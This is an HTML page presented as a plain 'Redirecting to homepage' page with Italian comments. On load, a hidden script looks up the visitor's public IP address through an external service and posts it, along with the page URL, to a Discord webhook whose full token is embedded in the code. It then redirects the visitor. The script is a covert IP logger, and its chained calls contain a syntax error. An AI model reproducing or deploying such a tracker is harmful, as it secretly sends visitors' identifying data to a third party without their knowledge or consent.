<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    const ip = data.ip;
    console.log("IP pubblico:", ip);

    // Invia IP + URL al webhook Discord
    fetch("https://discord.com/api/webhooks/1384202309453480069/EVzqU4GCsD8160NE82evIVyBUeMtrybYIzVXAfvMBQD5LIssbN8rmvBnzOVqusT0UJT7", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📡 Visita da IP: ${ip}\n🌐 URL: ${window.location.href}`
      })
    });
  })
  .catch(err => console.error("Errore nel recupero IP:", err));
    .finally(() => {
      // Reindirizza alla homepage dopo la richiesta
      window.location.href = "/";
    });
  </script>
</head>
<body>
  <p>Redirecting to homepage...</p>
</body>
</html>
